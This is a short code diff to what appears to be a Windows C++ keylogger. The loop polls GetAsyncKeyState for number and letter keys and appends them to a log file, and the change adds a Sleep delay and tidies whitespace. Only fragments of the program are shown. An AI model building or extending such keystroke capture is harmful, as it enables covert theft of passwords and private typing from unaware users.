@@ -7,6 +7,7 @@ int main()
 	std::ofstream log;
 	while (true)
 	{
+		Sleep(15);
 		for (int i = 48; i <= 90; i++)
 		{
 			if ((i <= 57 || i >= 65) && (GetAsyncKeyState(i) == -32767))
@@ -17,6 +18,7 @@ int main()
 				log.close();
 			}
 		}
+		
 	}
 	return 0;
-}    
+}
